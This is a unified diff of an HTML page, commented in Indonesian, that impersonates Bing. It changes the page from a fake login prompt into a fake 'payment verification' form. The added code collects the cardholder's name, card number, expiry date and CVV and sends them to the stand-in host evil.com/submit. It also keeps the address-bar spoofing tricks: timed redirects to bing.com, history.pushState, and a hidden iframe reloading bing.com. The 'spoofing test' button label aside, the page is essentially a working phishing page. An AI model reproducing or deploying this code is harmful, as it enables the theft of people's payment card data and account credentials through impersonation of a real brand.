@@ -1,46 +1,75 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <title>Bing.com</title>
+    <title>Bing.com - Verifikasi Pembayaran</title>
 </head>
 <body>
-    <h3>Masukkan Kredensial untuk Verifikasi Akun Bing</h3>
+    <h2>Verifikasi Pembayaran Diperlukan untuk Melanjutkan</h2>
     <button onclick="startSpoof()">Mulai Uji Spoofing</button>
     
+    <div id="credit-card-form" style="display:none;">
+        <form method="POST" action="https://evil.com/submit" autocomplete="on">
+            <label for="name">Nama di Kartu:</label><br>
+            <input type="text" id="name" name="name" placeholder="Nama Lengkap" autocomplete="name" required><br><br>
+            
+            <label for="cc-number">Nomor Kartu Kredit:</label><br>
+            <input type="text" id="cc-number" name="cc-number" placeholder="1234 5678 9012 3456" autocomplete="cc-number" required><br><br>
+            
+            <label for="cc-exp">Tanggal Kedaluwarsa:</label><br>
+            <input type="text" id="cc-exp" name="cc-exp" placeholder="MM/YY" autocomplete="cc-exp" required><br><br>
+            
+            <label for="cc-csc">CVV:</label><br>
+            <input type="text" id="cc-csc" name="cc-csc" placeholder="123" autocomplete="cc-csc" required><br><br>
+            
+            <input type="submit" value="Verifikasi Pembayaran">
+        </form>
+    </div>
+
     <script>
         function startSpoof() {
-            // Langkah 1: Ubah konten halaman untuk memuat form palsu
-            document.write(`
-                <html>
-                    <title>Bing.com</title>
-                    <form method="POST" action="https://evil.com" name="loginForm">
-                        <label>Login:</label>
-                        <input type="text" name="username"><br>
-                        <label>Password:</label>
-                        <input type="password" name="password"><br>
-                        <input type="submit" value="Login">
-                    </form>
-                </html>
-            `);
+            // Langkah 1: Tampilkan form setelah spoofing address bar dimulai
+            document.getElementById("credit-card-form").style.display = "block";
 
-            // Langkah 2: Set URL address bar ke `bing.com` menggunakan pengalihan periodik
+            // Langkah 2: Buat elemen form dinamis tanpa mengganti seluruh halaman
+            const spoofedForm = document.createElement('div');
+            spoofedForm.innerHTML = `
+                <h2>Masukkan Informasi Kartu Kredit Anda untuk Verifikasi Akun Bing</h2>
+                <form method="POST" action="https://evil.com/submit" autocomplete="on">
+                    <label for="name">Nama di Kartu:</label><br>
+                    <input type="text" id="name" name="name" placeholder="Nama Lengkap" autocomplete="name" required><br><br>
+                    
+                    <label for="cc-number">Nomor Kartu Kredit:</label><br>
+                    <input type="text" id="cc-number" name="cc-number" placeholder="1234 5678 9012 3456" autocomplete="cc-number" required><br><br>
+                    
+                    <label for="cc-exp">Tanggal Kedaluwarsa:</label><br>
+                    <input type="text" id="cc-exp" name="cc-exp" placeholder="MM/YY" autocomplete="cc-exp" required><br><br>
+                    
+                    <label for="cc-csc">CVV:</label><br>
+                    <input type="text" id="cc-csc" name="cc-csc" placeholder="123" autocomplete="cc-csc" required><br><br>
+                    
+                    <input type="submit" value="Verifikasi Pembayaran">
+                </form>
+            `;
+            document.body.appendChild(spoofedForm); // Menambahkan form ke dalam body tanpa mengganti konten yang sudah ada
+
+            // Langkah 3: Spoofing URL address bar ke `bing.com`
             document.location = "https://bing.com:1234";
-            setInterval(() => {
+            setInterval(function() {
                 document.location = "https://bing.com:1234";
-            }, 11000);  // Interval yang lebih singkat untuk mempertahankan URL
+            }, 11000);  // Interval untuk menjaga spoofing URL
 
-            // Langkah 3: Tambahkan pushState untuk memodifikasi URL tanpa perubahan halaman
-            history.pushState({}, "Bing.com", "/login");
+            // Langkah 4: Manipulasi history untuk menjaga URL di address bar
+            history.pushState({}, "Bing.com - Verifikasi Pembayaran", "/login");
 
-            // Langkah 4: Jalankan pengalihan otomatis pada iframe tersembunyi untuk menjaga konsistensi address bar
+            // Langkah 5: Gunakan iframe tersembunyi untuk menjaga konsistensi URL spoofing
             let hiddenFrame = document.createElement("iframe");
             hiddenFrame.style.display = "none";
             hiddenFrame.src = "https://bing.com";
             document.body.appendChild(hiddenFrame);
 
-            setInterval(() => {
+            setInterval(function() {
                 hiddenFrame.src = "https://bing.com";
-            }, 15000); // Interval untuk iframe yang lebih panjang untuk menambah stabilitas
+            }, 15000); // Interval untuk iframe lebih panjang
         }
     </script>
 </body>
